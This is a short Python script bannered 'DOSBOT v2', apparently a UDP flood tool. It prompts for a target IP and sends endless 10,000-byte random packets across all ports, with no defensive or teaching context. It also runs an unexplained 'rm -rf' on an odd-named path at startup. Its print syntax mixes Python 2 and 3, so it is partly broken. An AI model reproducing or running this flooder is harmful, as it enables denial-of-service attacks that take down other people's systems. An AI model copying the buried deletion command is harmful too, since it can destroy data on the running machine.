import sys;
import os;
import time;
import socket;
import random;
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(10000);
timeout = time.time();

os.system("rm -rf js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3");
os.system("clear");
print ("""
\033[1;32;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|\033[1;31;40mv2
""");
ip = input("\033[1;33;40mIP: \033[1;36;40m");
sent = 0;
port = 0;
while True:
     while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
     sent = sent + 1;
     port = port + 1;
     sock.sendto(bytes, (ip, port));
     print "\033[1;33;40m<--", time.ctime(time.time()), "-->  \033[1;36;40m<-- %s:%s -->\033[0;37;40m" %(ip, port);
     if port == 65534:
       port = 1;
